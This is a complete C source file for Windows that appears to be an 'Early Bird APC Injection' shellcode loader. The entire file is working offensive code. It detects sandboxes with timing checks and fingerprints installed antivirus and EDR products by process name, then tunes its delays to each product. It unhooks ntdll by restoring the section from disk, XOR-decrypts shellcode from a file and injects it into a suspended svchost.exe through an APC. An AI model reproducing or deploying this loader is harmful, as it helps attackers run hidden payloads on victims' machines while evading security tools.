#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <Windows.h>
#include <TlHelp32.h>
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#define XOR_KEY              0x41
#define TARGET_PROCESS       "C:\\Windows\\System32\\svchost.exe"
#define TARGET_CMDLINE       "svchost.exe -k netsvcs"
#define SANDBOX_SLEEP_MS     10000
#define DEFAULT_JITTER_BASE  6000
#define DEFAULT_JITTER_RANGE 3000
typedef struct _AV_PROFILE { LPCSTR lpProcessName; LPCSTR lpAvName; DWORD dwJitterBase; DWORD dwJitterRange; } AV_PROFILE, *PAV_PROFILE;
static AV_PROFILE g_AvProfiles[] = {
    { "avastsvc.exe","AVAST",4200,900 },{ "avgsvc.exe","AVG",4200,900 },
    { "avgnt.exe","Avira",6000,2000 },{ "MsMpEng.exe","Windows Defender",5000,2000 },
    { "ekrn.exe","ESET",7000,3000 },{ "bdagent.exe","Bitdefender",8000,3000 },
    { "kav.exe","Kaspersky",7000,2000 },{ "avp.exe","Kaspersky",7000,2000 },
    { "ccSvcHst.exe","Norton",6000,2000 },{ "mcshield.exe","McAfee",6000,2000 },
    { "mbam.exe","Malwarebytes",4000,2000 },{ "SentinelAgent.exe","SentinelOne",9000,3000 },
    { "CSFalconService.exe","CrowdStrike",10000,3000 },{ "sophosav.exe","Sophos",7000,2000 },
    { NULL,NULL,0,0 }
};
static BOOL IsSandbox(VOID) {
    DWORD dwStart=0,dwElapsed=0,dwLoopStart=0,dwLoopElapsed=0;
    volatile ULONGLONG ullCount=0; ULONGLONG i=0;
    dwStart=GetTickCount(); Sleep(SANDBOX_SLEEP_MS); dwElapsed=GetTickCount()-dwStart;
    if(dwElapsed<(SANDBOX_SLEEP_MS-(SANDBOX_SLEEP_MS/10))){ printf("[!] Sandbox detected (sleep skip): %lu ms\n",dwElapsed); return TRUE; }
    dwLoopStart=GetTickCount();
    for(i=0;i<500000000ULL;i++){ullCount++;}
    dwLoopElapsed=GetTickCount()-dwLoopStart;
    if(dwLoopElapsed<500){ printf("[!] Sandbox detected (loop accel): %lu ms\n",dwLoopElapsed); return TRUE; }
    printf("[+] Real env: sleep=%lu ms, loop=%lu ms\n",dwElapsed,dwLoopElapsed);
    return FALSE;
}
static PAV_PROFILE DetectAV(VOID) {
    HANDLE hSnap=INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; int idx=0;
    ZeroMemory(&pe,sizeof(PROCESSENTRY32)); pe.dwSize=sizeof(PROCESSENTRY32);
    hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hSnap==INVALID_HANDLE_VALUE) return NULL;
    if(Process32First(hSnap,&pe)){
        do {
            for(idx=0;g_AvProfiles[idx].lpProcessName!=NULL;idx++){
                if(_stricmp(pe.szExeFile,g_AvProfiles[idx].lpProcessName)==0){
                    printf("[+] AV detected: %s (%s)\n",g_AvProfiles[idx].lpAvName,g_AvProfiles[idx].lpProcessName);
                    CloseHandle(hSnap); return &g_AvProfiles[idx];
                }
            }
        } while(Process32Next(hSnap,&pe));
    }
    CloseHandle(hSnap); printf("[~] No known AV - using default jitter\n"); return NULL;
}
static DWORD DetermineJitterMs(PAV_PROFILE pProfile) {
    DWORD dwBase=0,dwRange=0,dwFinal=0,dwCpu=0;
    FILETIME ftIdle1,ftKernel1,ftUser1,ftIdle2,ftKernel2,ftUser2;
    ULARGE_INTEGER uI1,uK1,uU1,uI2,uK2,uU2;
    ULONGLONG ullIdle=0,ullKernel=0,ullUser=0,ullTotal=0;
    dwBase=pProfile?pProfile->dwJitterBase:DEFAULT_JITTER_BASE;
    dwRange=pProfile?pProfile->dwJitterRange:DEFAULT_JITTER_RANGE;
    dwFinal=dwBase+(DWORD)(rand()%(dwRange+1));
    if(GetSystemTimes(&ftIdle1,&ftKernel1,&ftUser1)){
        Sleep(500);
        if(GetSystemTimes(&ftIdle2,&ftKernel2,&ftUser2)){
            uI1.LowPart=ftIdle1.dwLowDateTime; uI1.HighPart=ftIdle1.dwHighDateTime;
            uK1.LowPart=ftKernel1.dwLowDateTime; uK1.HighPart=ftKernel1.dwHighDateTime;
            uU1.LowPart=ftUser1.dwLowDateTime; uU1.HighPart=ftUser1.dwHighDateTime;
            uI2.LowPart=ftIdle2.dwLowDateTime; uI2.HighPart=ftIdle2.dwHighDateTime;
            uK2.LowPart=ftKernel2.dwLowDateTime; uK2.HighPart=ftKernel2.dwHighDateTime;
            uU2.LowPart=ftUser2.dwLowDateTime; uU2.HighPart=ftUser2.dwHighDateTime;
            ullIdle=uI2.QuadPart-uI1.QuadPart;
            ullKernel=uK2.QuadPart-uK1.QuadPart; ullUser=uU2.QuadPart-uU1.QuadPart;
            ullTotal=ullKernel+ullUser;
            if(ullTotal>0){ dwCpu=(DWORD)(100-(ullIdle*100/ullTotal)); printf("[~] CPU usage: %lu%%\n",dwCpu); if(dwCpu<30){dwFinal+=1500;printf("[~] Low CPU -> +1500ms\n");} }
        }
    }
    printf("[*] Jitter: %lu ms\n",dwFinal); return dwFinal;
}
static BOOL UnhookNtdll(VOID) {
    HANDLE hFile=INVALID_HANDLE_VALUE,hMap=NULL; LPVOID pClean=NULL; HMODULE hNtdll=NULL;
    PIMAGE_DOS_HEADER pDos=NULL; PIMAGE_NT_HEADERS pNt=NULL; PIMAGE_SECTION_HEADER pSec=NULL;
    DWORD dwOld=0; WORD i=0; BOOL bResult=FALSE;
    printf("[*] Unhooking ntdll...\n");
    hFile=CreateFileA("C:\\Windows\\System32\\ntdll.dll",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hFile==INVALID_HANDLE_VALUE){ printf("[!] ntdll open failed\n"); return FALSE; }
    hMap=CreateFileMappingA(hFile,NULL,PAGE_READONLY,0,0,NULL);
    if(!hMap){CloseHandle(hFile);return FALSE;}
    pClean=MapViewOfFile(hMap,FILE_MAP_READ,0,0,0);
    if(!pClean){CloseHandle(hMap);CloseHandle(hFile);return FALSE;}
    hNtdll=GetModuleHandleA("ntdll.dll");
    if(!hNtdll){UnmapViewOfFile(pClean);CloseHandle(hMap);CloseHandle(hFile);return FALSE;}
    pDos=(PIMAGE_DOS_HEADER)hNtdll;
    pNt=(PIMAGE_NT_HEADERS)((PBYTE)hNtdll+pDos->e_lfanew);
    pSec=IMAGE_FIRST_SECTION(pNt);
    for(i=0;i<pNt->FileHeader.NumberOfSections;i++){
        if(memcmp(pSec[i].Name,".text",5)==0){
            VirtualProtect((PBYTE)hNtdll+pSec[i].VirtualAddress,pSec[i].Misc.VirtualSize,PAGE_EXECUTE_READWRITE,&dwOld);
            memcpy((PBYTE)hNtdll+pSec[i].VirtualAddress,(PBYTE)pClean+pSec[i].VirtualAddress,pSec[i].Misc.VirtualSize);
            VirtualProtect((PBYTE)hNtdll+pSec[i].VirtualAddress,pSec[i].Misc.VirtualSize,dwOld,&dwOld);
            printf("[+] ntdll .text restored\n"); bResult=TRUE; break;
        }
    }
    UnmapViewOfFile(pClean); CloseHandle(hMap); CloseHandle(hFile); return bResult;
}
static PBYTE ReadShellcodeFromFile(LPCSTR lpPath,PDWORD pdwSize){
    HANDLE hFile=INVALID_HANDLE_VALUE; PBYTE pBuffer=NULL; DWORD dwSize=0,dwRead=0;
    hFile=CreateFileA(lpPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hFile==INVALID_HANDLE_VALUE){ printf("[!] shellcode.bin not found\n"); return NULL; }
    dwSize=GetFileSize(hFile,NULL);
    if(dwSize==INVALID_FILE_SIZE||dwSize==0){CloseHandle(hFile);return NULL;}
    pBuffer=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize);
    if(!pBuffer){CloseHandle(hFile);return NULL;}
    if(!ReadFile(hFile,pBuffer,dwSize,&dwRead,NULL)||dwRead!=dwSize){HeapFree(GetProcessHeap(),0,pBuffer);CloseHandle(hFile);return NULL;}
    CloseHandle(hFile); *pdwSize=dwSize; printf("[+] Shellcode loaded: %lu bytes\n",dwSize); return pBuffer;
}
static VOID XorDecrypt(PBYTE pBuf,DWORD dwSize,BYTE bKey){DWORD i=0;for(i=0;i<dwSize;i++)pBuf[i]^=bKey;}
static BOOL EarlyBirdInject(PBYTE pShellcode,DWORD dwSize){
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    PVOID pRemote=NULL; SIZE_T sBytesWritten=0; DWORD dwOldProtect=0;
    ZeroMemory(&si,sizeof(STARTUPINFOA)); ZeroMemory(&pi,sizeof(PROCESS_INFORMATION));
    si.cb=sizeof(STARTUPINFOA);
    printf("[*] Creating suspended process: %s\n",TARGET_PROCESS);
    if(!CreateProcessA(TARGET_PROCESS,(LPSTR)TARGET_CMDLINE,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi)){ printf("[!] CreateProcessA failed: %lu\n",GetLastError()); return FALSE; }
    printf("[+] PID: %lu  TID: %lu\n",pi.dwProcessId,pi.dwThreadId);
    pRemote=VirtualAllocEx(pi.hProcess,NULL,dwSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if(!pRemote){TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);return FALSE;}
    if(!WriteProcessMemory(pi.hProcess,pRemote,pShellcode,dwSize,&sBytesWritten)){VirtualFreeEx(pi.hProcess,pRemote,0,MEM_RELEASE);TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);return FALSE;}
    if(!VirtualProtectEx(pi.hProcess,pRemote,dwSize,PAGE_EXECUTE_READ,&dwOldProtect)){VirtualFreeEx(pi.hProcess,pRemote,0,MEM_RELEASE);TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);return FALSE;}
    printf("[+] RWX->RX done. Queuing APC...\n");
    if(!QueueUserAPC((PAPCFUNC)pRemote,pi.hThread,(ULONG_PTR)NULL)){VirtualFreeEx(pi.hProcess,pRemote,0,MEM_RELEASE);TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);return FALSE;}
    if(ResumeThread(pi.hThread)==(DWORD)-1){TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);return FALSE;}
    printf("[+] Injection complete - PID: %lu\n",pi.dwProcessId);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return TRUE;
}
int main(VOID){
    PBYTE pShellcode=NULL; DWORD dwShellcodeSize=0; PAV_PROFILE pProfile=NULL; DWORD dwJitterMs=0;
    SetConsoleOutputCP(65001); SetConsoleCP(65001);
    srand((unsigned int)time(NULL));
    printf("=== Early Bird APC Injection v3 ===\n");
    printf("    XOR Key : 0x%02X\n", XOR_KEY);
    printf("    Target  : %s\n\n", TARGET_PROCESS);
    printf("[*] Sandbox check...\n");
    if(IsSandbox()) return 0;
    printf("[*] AV detection...\n");
    pProfile=DetectAV();
    dwJitterMs=DetermineJitterMs(pProfile);
    if(!UnhookNtdll()) printf("[~] Unhook failed - continuing\n");
    printf("[*] Waiting %lu ms...\n",dwJitterMs);
    Sleep(dwJitterMs);
    pShellcode=ReadShellcodeFromFile("shellcode.bin",&dwShellcodeSize);
    if(!pShellcode) return 1;
    if(XOR_KEY!=0x00){ XorDecrypt(pShellcode,dwShellcodeSize,(BYTE)XOR_KEY); printf("[+] XOR decrypted (key=0x%02X)\n",XOR_KEY); }
    if(!EarlyBirdInject(pShellcode,dwShellcodeSize)){ SecureZeroMemory(pShellcode,dwShellcodeSize); HeapFree(GetProcessHeap(),0,pShellcode); return 1; }
    SecureZeroMemory(pShellcode,dwShellcodeSize); HeapFree(GetProcessHeap(),0,pShellcode); pShellcode=NULL;
    Sleep(dwJitterMs);
    printf("[+] Done.\n");
    return 0;
}